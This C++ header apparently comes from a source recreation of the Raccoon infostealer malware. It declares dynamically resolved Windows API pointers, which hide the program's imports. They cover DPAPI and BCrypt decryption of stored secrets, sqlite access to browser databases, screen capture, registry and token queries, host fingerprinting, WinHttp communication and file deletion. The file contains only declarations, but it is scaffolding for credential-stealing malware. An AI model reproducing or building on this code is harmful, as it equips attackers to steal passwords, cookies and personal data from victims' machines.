#pragma once

#include "windows.h"
#include "sqlite3.h"
#include "Shlobj.h"
#include "winhttp.h"
#include <gdiplus.h>

/* 
Global function definitions to support Raccoon's function resolution
*/
typedef HMODULE (*RacLoadLibraryW)(LPCWSTR);
extern RacLoadLibraryW g_racLoadLibraryW;

typedef FARPROC(*RacGetProcAddress)(HMODULE, LPCSTR);
extern RacGetProcAddress g_racGetProcAddress;

typedef BOOL (*RacBitBlt)(
	HDC   hdc,
	int   x,
	int   y,
	int   cx,
	int   cy,
	HDC   hdcSrc,
	int   x1,
	int   y1,
	DWORD rop
	);
extern RacBitBlt g_racBitBlt;

typedef HRESULT(*RacCLSIDFromString)(
	LPCOLESTR lpsz,
	LPCLSID   pclsid
	);
extern RacCLSIDFromString g_racCLSIDFromString;

typedef bool (*RacConvertSidToStringSidW)(
	PSID   Sid,
	LPWSTR* StringSid
	);
extern RacConvertSidToStringSidW g_racConvertSidToStringSidW;

typedef HBITMAP(*RacCreateCompatibleBitmap)(
	HDC hdc,
	int cx,
	int cy
	);
extern RacCreateCompatibleBitmap g_racCreateCompatibleBitmap;

typedef HDC(*RacCreateCompatibleDC)(
	HDC hdc
	);
extern RacCreateCompatibleDC g_racCreateCompatibleDC;

typedef HANDLE(*RacCreateMutexW)(
	LPSECURITY_ATTRIBUTES lpMutexAttributes,
	BOOL                  bInitialOwner,
	LPCWSTR               lpName
	);
extern RacCreateMutexW g_racCreateMutexW;

typedef bool(*RacCreateProcessW)(
	LPCWSTR               lpApplicationName,
	LPWSTR                lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCWSTR               lpCurrentDirectory,
	LPSTARTUPINFOW        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);
extern RacCreateProcessW g_racCreateProcessW;

typedef bool(*RacFindClose)(
	HANDLE hFindFile
	);
extern RacFindClose g_racFindClose;

typedef HANDLE(*RacFindFirstFileW)(
	LPCWSTR            lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
	);
extern RacFindFirstFileW g_racFindFirstFileW;

typedef bool(*RacFindNextFileW)(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
	);
extern RacFindNextFileW g_racFindNextFileW;

typedef HANDLE(*RacGetCurrentProcess)();
extern RacGetCurrentProcess g_racGetCurrentProcess;

typedef HDC(*RacGetDC)(
	HWND hWnd
	);
extern RacGetDC g_racGetDC;

typedef _Post_equals_last_error_ DWORD(*RacGetLastError)();
extern RacGetLastError g_racGetLastError;

typedef int (*RacGetLocaleInfoW)(
	LCID   Locale,
	LCTYPE LCType,
	LPWSTR lpLCData,
	int    cchData
	);
extern RacGetLocaleInfoW g_racGetLocaleInfoW;

typedef DWORD(*RacGetModuleFileNameW)(
	HMODULE hModule,
	LPWSTR  lpFilename,
	DWORD   nSize
	);
extern RacGetModuleFileNameW g_racGetModuleFileNameW;

typedef void (*RacGetSystemInfo)(
	LPSYSTEM_INFO lpSystemInfo
	);
extern RacGetSystemInfo g_racGetSystemInfo;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getsystemmetrics
typedef int (*RacGetSystemMetrics)(
	int nIndex
	);
extern RacGetSystemMetrics g_racGetSystemMetrics;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/wow64apiset/nf-wow64apiset-getsystemwow64directoryw
typedef UINT(*RacGetSystemWow64DirectoryW)(
	LPWSTR lpBuffer,
	UINT   uSize
	);
extern RacGetSystemWow64DirectoryW g_racGetSystemWow64DirectoryW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/timezoneapi/nf-timezoneapi-gettimezoneinformation
typedef DWORD(*RacGetTimeZoneInformation)(
	LPTIME_ZONE_INFORMATION lpTimeZoneInformation
	);
extern RacGetTimeZoneInformation g_racGetTimeZoneInformation;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
typedef bool(*RacGetTokenInformation)(
	HANDLE                  TokenHandle,
	TOKEN_INFORMATION_CLASS TokenInformationClass,
	LPVOID                  TokenInformation,
	DWORD                   TokenInformationLength,
	PDWORD                  ReturnLength
	);
extern RacGetTokenInformation g_racGetTokenInformation;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-getuserdefaultlcid
typedef LCID(*RacGetUserDefaultLCID)();
extern RacGetUserDefaultLCID g_racGetUserDefaultLCID;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-getuserdefaultlocalename
typedef int (*RacGetUserDefaultLocaleName)(
	LPWSTR lpLocaleName,
	int    cchLocaleName
	);
extern RacGetUserDefaultLocaleName g_racGetUserDefaultLocaleName;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globalalloc
typedef HGLOBAL(*RacGlobalAlloc)( // REMOVED: DECLSPEC_ALLOCATOR
	UINT   uFlags,
	SIZE_T dwBytes
	);
extern RacGlobalAlloc g_racGlobalAlloc;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globalfree
typedef HGLOBAL(*RacGlobalFree)(
	_Frees_ptr_opt_ HGLOBAL hMem
	);
extern RacGlobalFree g_racGlobalFree;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex
typedef bool(*RacGlobalMemoryStatusEx)(
	LPMEMORYSTATUSEX lpBuffer
	);
extern RacGlobalMemoryStatusEx g_racGlobalMemoryStatusEx;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localalloc
typedef HLOCAL(*RacLocalAlloc)( // REMOVED: DECLSPEC_ALLOCATOR
	UINT   uFlags,
	SIZE_T uBytes
	);
extern RacLocalAlloc g_racLocalAlloc;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localfree
typedef HLOCAL(*RacLocalFree)(
	_Frees_ptr_opt_ HLOCAL hMem
	);
extern RacLocalFree g_racLocalFree;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupaccountnamew
typedef bool(*RacLookupAccountNameW)(
	LPCWSTR       lpSystemName,
	LPCWSTR       lpAccountName,
	PSID          Sid,
	LPDWORD       cbSid,
	LPWSTR        ReferencedDomainName,
	LPDWORD       cchReferencedDomainName,
	PSID_NAME_USE peUse
	);
extern RacLookupAccountNameW g_racLookupAccountNameW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-openmutexw
typedef HANDLE(*RacOpenMutexW)(
	DWORD   dwDesiredAccess,
	BOOL    bInheritHandle,
	LPCWSTR lpName
	);
extern RacOpenMutexW g_racOpenMutexW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
typedef LSTATUS(*RacRegCloseKey)(
	HKEY hKey
	);
extern RacRegCloseKey g_racRegCloseKey;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regenumkeyexw
typedef LSTATUS(*RacRegEnumKeyExW)(
	HKEY      hKey,
	DWORD     dwIndex,
	LPWSTR    lpName,
	LPDWORD   lpcchName,
	LPDWORD   lpReserved,
	LPWSTR    lpClass,
	LPDWORD   lpcchClass,
	PFILETIME lpftLastWriteTime
	);
extern RacRegEnumKeyExW g_racRegEnumKeyExW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw
typedef LSTATUS(*RacRegOpenKeyExW)(
	HKEY    hKey,
	LPCWSTR lpSubKey,
	DWORD   ulOptions,
	REGSAM  samDesired,
	PHKEY   phkResult
	);
extern RacRegOpenKeyExW g_racRegOpenKeyExW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw
typedef LSTATUS(*RacRegQueryValueExW)(
	HKEY    hKey,
	LPCWSTR lpValueName,
	LPDWORD lpReserved,
	LPDWORD lpType,
	LPBYTE  lpData,
	LPDWORD lpcbData
	);
extern RacRegQueryValueExW g_racRegQueryValueExW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-releasemutex
typedef bool(*RacReleaseMutex)(
	HANDLE hMutex
	);
extern RacReleaseMutex g_racReleaseMutex;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-selectobject
typedef HGDIOBJ(*RacSelectObject)(
	HDC     hdc,
	HGDIOBJ h
	);
extern RacSelectObject g_racSelectObject;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetknownfolderpath
typedef HRESULT(*RacSHGetKnownFolderPath)(
	REFKNOWNFOLDERID rfid,
	DWORD            dwFlags,
	HANDLE           hToken,
	PWSTR* ppszPath
	);
extern RacSHGetKnownFolderPath g_racSHGetKnownFolderPath;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-strstriw
typedef PCWSTR(*RacStrStrIW)(
	PCWSTR pszFirst,
	PCWSTR pszSrch
	);
extern RacStrStrIW g_racStrStrIW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-deleteobject
typedef bool(*RacDeleteObject)(
	HGDIOBJ ho
	);
extern RacDeleteObject g_racDeleteObject;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-deletedc
typedef bool(*RacDeleteDC)(
	HDC hdc
	);
extern RacDeleteDC g_racDeleteDC;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-releasedc
typedef int (*RacReleaseDC)(
	HWND hWnd,
	HDC  hDC
	);
extern RacReleaseDC g_racReleaseDC;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstokentypedef
typedef bool(*RacOpenProcessToken)(
	HANDLE  ProcessHandle,
	DWORD   DesiredAccess,
	PHANDLE TokenHandle
	);
extern RacOpenProcessToken g_racOpenProcessToken;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinarya
typedef bool(*RacCryptStringToBinaryA)(
	LPCSTR pszString,
	DWORD  cchString,
	DWORD  dwFlags,
	BYTE* pbBinary,
	DWORD* pcbBinary,
	DWORD* pdwSkip,
	DWORD* pdwFlags
	);
extern RacCryptStringToBinaryA g_racCryptStringToBinaryA;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-deletefilew
typedef bool(*RacDeleteFileW)(
	LPCWSTR lpFileName
	);
extern RacDeleteFileW g_racDeleteFileW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary
typedef bool(*RacFreeLibrary)(
	HMODULE hLibModule
	);
extern RacFreeLibrary g_racFreeLibrary;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-unmapviewoffile
typedef bool(*RacUnmapViewOfFile)(
	LPCVOID lpBaseAddress
	);
extern RacUnmapViewOfFile g_racUnmapViewOfFile;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptopenalgorithmprovider
typedef NTSTATUS(*RacBCryptOpenAlgorithmProvider)(
	BCRYPT_ALG_HANDLE* phAlgorithm,
	LPCWSTR           pszAlgId,
	LPCWSTR           pszImplementation,
	ULONG             dwFlags
	);
extern RacBCryptOpenAlgorithmProvider g_racBCryptOpenAlgorithmProvider;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptclosealgorithmprovider
typedef NTSTATUS(*RacBCryptCloseAlgorithmProvider)(
	BCRYPT_ALG_HANDLE hAlgorithm,
	ULONG             dwFlags
	);
extern RacBCryptCloseAlgorithmProvider g_racBCryptCloseAlgorithmProvider;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata
typedef DPAPI_IMP bool(*RacCryptUnprotectData)(
	DATA_BLOB* pDataIn,
	LPWSTR* ppszDataDescr,
	DATA_BLOB* pOptionalEntropy,
	PVOID                     pvReserved,
	CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
	DWORD                     dwFlags,
	DATA_BLOB* pDataOut
	);
extern RacCryptUnprotectData g_racCryptUnprotectData;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptsetproperty
typedef NTSTATUS(*RacBCryptSetProperty)(
	BCRYPT_HANDLE hObject,
	LPCWSTR       pszProperty,
	PUCHAR        pbInput,
	ULONG         cbInput,
	ULONG         dwFlags
	);
extern RacBCryptSetProperty g_racBCryptSetProperty;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptgeneratesymmetrickey
typedef NTSTATUS(*RacBCryptGenerateSymmetricKey)(
	BCRYPT_ALG_HANDLE hAlgorithm,
	BCRYPT_KEY_HANDLE* phKey,
	PUCHAR            pbKeyObject,
	ULONG             cbKeyObject,
	PUCHAR            pbSecret,
	ULONG             cbSecret,
	ULONG             dwFlags
	);
extern RacBCryptGenerateSymmetricKey g_racBCryptGenerateSymmetricKey;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptdecrypt
typedef NTSTATUS(*RacBCryptDecrypt)(
	BCRYPT_KEY_HANDLE hKey,
	PUCHAR            pbInput,
	ULONG             cbInput,
	VOID* pPaddingInfo,
	PUCHAR            pbIV,
	ULONG             cbIV,
	PUCHAR            pbOutput,
	ULONG             cbOutput,
	ULONG* pcbResult,
	ULONG             dwFlags
	);
extern RacBCryptDecrypt g_racBCryptDecrypt;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen
typedef HINTERNET(*RacWinHttpOpen)(
	LPCWSTR pszAgentW,
	DWORD   dwAccessType,
	LPCWSTR pszProxyW,
	LPCWSTR pszProxyBypassW,
	DWORD   dwFlags
	);
extern RacWinHttpOpen g_racWinHttpOpen;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
typedef HINTERNET(*RacWinHttpConnect)(
	HINTERNET     hSession,
	LPCWSTR       pswzServerName,
	INTERNET_PORT nServerPort,
	DWORD         dwReserved
	);
extern RacWinHttpConnect g_racWinHttpConnect;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest
typedef HINTERNET(*RacWinHttpOpenRequest)(
	HINTERNET hConnect,
	LPCWSTR   pwszVerb,
	LPCWSTR   pwszObjectName,
	LPCWSTR   pwszVersion,
	LPCWSTR   pwszReferrer,
	LPCWSTR* ppwszAcceptTypes,
	DWORD     dwFlags
	);
extern RacWinHttpOpenRequest g_racWinHttpOpenRequest;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpaddrequestheaders
typedef bool(*RacWinHttpAddRequestHeaders)(
	HINTERNET hRequest,
	LPCWSTR   lpszHeaders,
	DWORD     dwHeadersLength,
	DWORD     dwModifiers
	);
extern RacWinHttpAddRequestHeaders g_racWinHttpAddRequestHeaders;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
typedef bool(*RacWinHttpSendRequest)(
	HINTERNET hRequest,
	LPCWSTR   lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength,
	DWORD     dwTotalLength,
	DWORD_PTR dwContext
	);
extern RacWinHttpSendRequest g_racWinHttpSendRequest;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreceiveresponse
typedef bool(*RacWinHttpReceiveResponse)(
	HINTERNET hRequest,
	LPVOID    lpReserved
	);
extern RacWinHttpReceiveResponse g_racWinHttpReceiveResponse;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpqueryheaders
typedef bool(*RacWinHttpQueryHeaders)(
	HINTERNET hRequest,
	DWORD     dwInfoLevel,
	LPCWSTR   pwszName,
	LPVOID    lpBuffer,
	LPDWORD   lpdwBufferLength,
	LPDWORD   lpdwIndex
	);
extern RacWinHttpQueryHeaders g_racWinHttpQueryHeaders;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpquerydataavailable
typedef bool(*RacWinHttpQueryDataAvailable)(
	HINTERNET hRequest,
	LPDWORD   lpdwNumberOfBytesAvailable
	);
extern RacWinHttpQueryDataAvailable g_racWinHttpQueryDataAvailable;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreaddata
typedef bool(*RacWinHttpReadData)(
	HINTERNET hRequest,
	LPVOID    lpBuffer,
	DWORD     dwNumberOfBytesToRead,
	LPDWORD   lpdwNumberOfBytesRead
	);
extern RacWinHttpReadData g_racWinHttpReadData;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpclosehandle
typedef bool(*RacWinHttpCloseHandle)(
	HINTERNET hInternet
	);
extern RacWinHttpCloseHandle g_racWinHttpCloseHandle;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamew
typedef bool(*RacGetUserNameW)(
	LPWSTR  lpBuffer,
	LPDWORD pcbBuffer
	);
extern RacGetUserNameW g_racGetUserNameW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-removedirectoryw
typedef bool(*RacRemoveDirectoryW)(
	LPCWSTR lpPathName
	);
extern RacRemoveDirectoryW g_racRemoveDirectoryW;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/gdiplusinit/nf-gdiplusinit-gdiplusstartup
typedef Gdiplus::Status(*RacGdiplusStartup)(
	ULONG_PTR* token,
	const Gdiplus::GdiplusStartupInput* input,
	Gdiplus::GdiplusStartupOutput* output
	);
extern RacGdiplusStartup g_racGdiplusStartup;

// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/gdiplusinit/nf-gdiplusinit-gdiplusshutdown
typedef void (*RacGdiplusShutdown)(
	ULONG_PTR token
	);
extern RacGdiplusShutdown g_racGdiplusShutdown;

/*
* Fingerprint.cpp
*/
// MSDN: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumdisplaydevicesw
typedef bool (*RacEnumDisplayDevicesW)(
	LPCWSTR          lpDevice,
	DWORD            iDevNum,
	PDISPLAY_DEVICEW lpDisplayDevice,
	DWORD            dwFlags
	);
extern RacEnumDisplayDevicesW g_racEnumDisplayDevicesW;

/*
* sqlite3 function pointers
*/
typedef int (*RacSqlite3Open)(									// https://www.sqlite.org/c3ref/open.html
	const char* filename,   /* Database filename (UTF-8) */
	sqlite3** ppDb          /* OUT: SQLite db handle */
	);
typedef int (*RacSqlite3PrepareV2)(								// https://www.sqlite.org/c3ref/prepare.html
	sqlite3* db,            /* Database handle */
	const char* zSql,       /* SQL statement, UTF-8 encoded */
	int nByte,              /* Maximum length of zSql in bytes. */
	sqlite3_stmt** ppStmt,  /* OUT: Statement handle */
	const char** pzTail     /* OUT: Pointer to unused portion of zSql */
	);
typedef int (*RacSqliteFinalize)(sqlite3_stmt* pStmt);				// https://www.sqlite.org/c3ref/finalize.html
typedef int (*RacSqlite3Close)(sqlite3*);
typedef int (*RacSqlite3Step)(sqlite3_stmt*);
typedef const void* (*RacSqlite3ColumnBlob)(sqlite3_stmt*, int iCol);
typedef int (*RacSqlite3ColumnBytes)(sqlite3_stmt*, int iCol);
typedef const unsigned char* (*RacSqlite3ColumnText)(sqlite3_stmt*, int iCol);
typedef const char* (*RacSqlite3ErrMsg)(sqlite3*);